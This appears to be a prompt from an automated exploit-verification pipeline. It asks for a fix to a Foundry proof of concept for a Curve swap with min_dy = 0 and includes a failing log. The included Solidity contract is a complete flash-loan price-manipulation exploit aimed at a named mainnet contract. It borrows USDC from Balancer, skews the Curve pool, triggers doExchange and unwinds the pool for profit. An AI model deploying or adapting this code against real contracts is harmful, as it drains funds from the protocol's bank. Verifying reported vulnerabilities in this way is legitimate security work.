You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Public exchange uses Curve with `min_dy = 0`, enabling flash-loan price manipulation and value extraction
- claim: `doExchange()` is permissionless and calls `curve.exchange_underlying(1, 2, camount, 0)` with no minimum-output check. An attacker can temporarily skew the referenced Curve pool, invoke `doExchange()` while the contract is swapping freshly issued USDC from `from_bank`, and force the trade to clear at an arbitrarily bad rate.
- impact: A flash-loan attacker can steal a large fraction of the source bank's economic value in a single transaction. The contract will release USDC from `from_bank`, accept a near-zero amount of USDT, and send that diminished output to `to_bank`, while the attacker captures the manipulated spread when unwinding the pool distortion.
- exploit_paths: ["Attacker uses a flash loan or other temporary liquidity to move the Curve pool price sharply against USDC->USDT swaps.", "Attacker calls `doExchange(amount)` for a large amount up to the current `from_bank.balance()`.", "The contract invokes `from_bank.issue(address(this), amount)`, approves Curve, and swaps with `min_dy = 0`, accepting the manipulated rate.", "Attacker restores the pool and realizes profit from the price distortion while protocol value has been extracted from `from_bank`."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20BankLike {
    function balance() external returns (uint256);
    function token() external view returns (address, string memory);
}

interface IExchangeBetweenPoolsLike {
    function from_bank() external view returns (address);
    function to_bank() external view returns (address);
    function curve() external view returns (address);
    function minimum_amount() external view returns (uint256);
    function doExchange(uint256 amount) external returns (bool);
}

interface ICurveLike {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IBalancerFlashLoanRecipient recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IBalancerFlashLoanRecipient {
    address public constant TARGET = 0x765b8d7Cd8FF304f796f4B6fb1BCf78698333f6D;
    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address public constant CANONICAL_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address private _fromBank;
    address private _toBank;
    address private _curve;
    address private _usdc;
    address private _usdt;

    uint256 private _principalBaseline;
    bool private _principalInitialized;

    uint256 private _profit;
    uint256 public attemptCounter;
    string public lastFailure;

    constructor() {}

    function executeOnOpportunity() public {
        _discover();

        if (!_principalInitialized) {
            _principalInitialized = true;
            _principalBaseline = IERC20Like(_usdc).balanceOf(address(this));
        }

        uint256 victimAmount = _victimAmount();
        if (victimAmount == 0) {
            // Infeasible at this fork state if the bank cannot satisfy the target's own minimum amount gate.
            lastFailure = "from_bank balance below minimum_amount";
            _refreshProfit();
            return;
        }

        uint256 usdcPoolBalance = _curveBalance(1);
        uint256 usdtPoolBalance = _curveBalance(2);
        uint256 desiredManipulation = _selectManipulationAmount(victimAmount, usdcPoolBalance, usdtPoolBalance, attemptCounter);
        attemptCounter += 1;

        uint256 currentUsdc = IERC20Like(_usdc).balanceOf(address(this));
        if (currentUsdc > 0) {
            uint256 directManipulation = currentUsdc < desiredManipulation ? currentUsdc : desiredManipulation;
            if (directManipulation > 0) {
                try this.executeWithCapital(directManipulation, victimAmount) returns (bool) {
                    lastFailure = "";
                    _refreshProfit();
                    if (_profit > 0) {
                        return;
                    }
                } catch (bytes memory reason) {
                    lastFailure = _decodeRevertReason(reason);
                }
            }
        }

        uint256 postDirectUsdc = IERC20Like(_usdc).balanceOf(address(this));
        if (desiredManipulation <= postDirectUsdc) {
            _refreshProfit();
            return;
        }

        uint256 vaultLiquidity = IERC20Like(_usdc).balanceOf(BALANCER_VAULT);
        if (vaultLiquidity == 0) {
            // Infeasible here because the chosen realistic public flash-loan source has no USDC liquidity.
            lastFailure = "balancer vault has no USDC liquidity";
            _refreshProfit();
            return;
        }

        uint256 maxFlash = vaultLiquidity > 1 ? vaultLiquidity - 1 : 0;
        uint256 flashAmount = desiredManipulation - postDirectUsdc;
        if (flashAmount > maxFlash) {
            flashAmount = maxFlash;
        }

        if (flashAmount == 0) {
            lastFailure = "no flash amount available";
            _refreshProfit();
            return;
        }

        uint256 totalManipulation = postDirectUsdc + flashAmount;
        try this.startFlashLoan(flashAmount, totalManipulation, victimAmount) returns (bool) {
            lastFailure = "";
            _refreshProfit();
        } catch (bytes memory reason) {
            lastFailure = _decodeRevertReason(reason);
            _refreshProfit();
        }
    }

    function executeWithCapital(uint256 manipulationAmount, uint256 victimAmount) external returns (bool) {
        require(msg.sender == address(this), "self only");

        uint256 startingUsdc = IERC20Like(_usdc).balanceOf(address(this));
        _attack(manipulationAmount, victimAmount);
        uint256 endingUsdc = IERC20Like(_usdc).balanceOf(address(this));

        require(endingUsdc > startingUsdc, "direct attack unprofitable");
        _refreshProfit();
        return true;
    }

    function startFlashLoan(uint256 flashAmount, uint256 totalManipulation, uint256 victimAmount) external returns (bool) {
        require(msg.sender == address(this), "self only");

        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = IERC20Like(_usdc);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        bytes memory userData = abi.encode(totalManipulation, victimAmount, IERC20Like(_usdc).balanceOf(address(this)));
        IBalancerVault(BALANCER_VAULT).flashLoan(this, tokens, amounts, userData);

        _refreshProfit();
        return true;
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == BALANCER_VAULT, "vault only");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "single-token only");
        require(address(tokens[0]) == _usdc, "unexpected token");

        (uint256 totalManipulation, uint256 victimAmount, uint256 ownedUsdcBeforeLoan) =
            abi.decode(userData, (uint256, uint256, uint256));

        _attack(totalManipulation, victimAmount);

        uint256 repayAmount = amounts[0] + feeAmounts[0];
        uint256 usdcAfterAttack = IERC20Like(_usdc).balanceOf(address(this));

        require(usdcAfterAttack > ownedUsdcBeforeLoan + repayAmount, "flash attack unprofitable");
        _safeTransfer(_usdc, BALANCER_VAULT, repayAmount);
    }

    function profitToken() external view returns (address) {
        return _usdc == address(0) ? CANONICAL_USDC : _usdc;
    }

    function profitAmount() external view returns (uint256) {
        return _profit;
    }

    function _discover() internal {
        if (_curve != address(0) && _usdc != address(0) && _usdt != address(0)) {
            return;
        }

        IExchangeBetweenPoolsLike target = IExchangeBetweenPoolsLike(TARGET);
        _fromBank = target.from_bank();
        _toBank = target.to_bank();
        _curve = target.curve();

        (address fromToken,) = IERC20BankLike(_fromBank).token();
        (address toToken,) = IERC20BankLike(_toBank).token();

        _usdc = fromToken;
        _usdt = toToken;
    }

    function _victimAmount() internal returns (uint256) {
        uint256 minimumAmount = IExchangeBetweenPoolsLike(TARGET).minimum_amount();
        uint256 available = IERC20BankLike(_fromBank).balance();

        if (available < minimumAmount) {
            return 0;
        }
        return available;
    }

    function _attack(uint256 manipulationAmount, uint256 victimAmount) internal {
        require(manipulationAmount > 0, "no manipulation capital");

        uint256 usdcBalance = IERC20Like(_usdc).balanceOf(address(this));
        require(usdcBalance >= manipulationAmount, "insufficient USDC");

        _forceApprove(_usdc, _curve, 0);
        _forceApprove(_usdc, _curve, manipulationAmount);
        ICurveLike(_curve).exchange_underlying(1, 2, manipulationAmount, 0);

        // Path stage: invoke the permissionless vulnerable swap while the pool price is skewed.
        IExchangeBetweenPoolsLike(TARGET).doExchange(victimAmount);

        uint256 usdtBalance = IERC20Like(_usdt).balanceOf(address(this));
        require(usdtBalance > 0, "no USDT to unwind");

        _forceApprove(_usdt, _curve, 0);
        _forceApprove(_usdt, _curve, usdtBalance);
        ICurveLike(_curve).exchange_underlying(2, 1, usdtBalance, 0);
    }

    function _curveBalance(uint256 index) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = _curve.staticcall(abi.encodeWithSignature("balances(uint256)", index));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _selectManipulationAmount(
        uint256 victimAmount,
        uint256 usdcPoolBalance,
        uint256 usdtPoolBalance,
        uint256 attempt
    ) internal pure returns (uint256) {
        uint256 poolReference = usdtPoolBalance > 0 ? usdtPoolBalance : usdcPoolBalance;
        uint256 mode = attempt % 6;

        if (mode == 0) {
            return _max(victimAmount * 3, poolReference / 20);
        }
        if (mode == 1) {
            return _max(victimAmount * 8, poolReference / 10);
        }
        if (mode == 2) {
            return _max(victimAmount * 20, poolReference / 5);
        }
        if (mode == 3) {
            return _max(victimAmount * 40, (poolReference * 3) / 10);
        }
        if (mode == 4) {
            return _max(victimAmount * 80, poolReference / 2);
        }
        return _max(victimAmount * 120, (poolReference * 7) / 10);
    }

    function _refreshProfit() internal {
        if (_usdc == address(0) || !_principalInitialized) {
            _profit = 0;
            return;
        }

        uint256 currentUsdc = IERC20Like(_usdc).balanceOf(address(this));
        if (currentUsdc > _principalBaseline) {
            _profit = currentUsdc - _principalBaseline;
        } else {
            _profit = 0;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a >= b ? a : b;
    }

    function _decodeRevertReason(bytes memory reason) internal pure returns (string memory) {
        if (reason.length < 4) {
            return "call reverted";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(reason, 32))
        }

        if (selector == 0x08c379a0 && reason.length >= 68) {
            bytes memory sliced = new bytes(reason.length - 4);
            for (uint256 i = 4; i < reason.length; i++) {
                sliced[i - 4] = reason[i];
            }
            return abi.decode(sliced, (string));
        }

        if (selector == 0x4e487b71 && reason.length >= 36) {
            return "panic";
        }

        return "call reverted";
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: doexchange(amount), from_bank.balance(), from_bank.issue(address(this), amount), min_dy = 0; generated code does not cover paths indexes: 1, 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
